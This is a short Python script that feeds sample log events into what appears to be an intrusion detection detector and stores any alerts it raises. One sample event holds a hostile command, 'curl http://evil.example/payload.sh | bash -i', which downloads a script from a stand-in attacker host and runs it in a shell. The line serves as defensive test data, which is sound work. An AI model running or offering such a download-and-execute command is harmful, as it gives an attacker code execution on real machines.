import time
from app.schemas import LogEvent
from app.detector import IDSDetector
from app.storage import init_db, store_alert


def main() -> None:
    init_db()
    detector = IDSDetector()

    sample_events = [
        LogEvent(time.time(), "192.168.1.50", "server1", "ssh", "Failed password for invalid user admin"),
        LogEvent(time.time(), "10.0.0.15", "server2", "web", "curl http://evil.example/payload.sh | bash -i"),
        LogEvent(time.time(), "127.0.0.1", "server3", "cron", "trusted_update completed successfully")
    ]

    for event in sample_events:
        result = detector.predict_event(event)
        print(result)

        if result.predicted_label != "benign" and not result.deduplicated:
            store_alert(result)


if __name__ == "__main__":
    main()
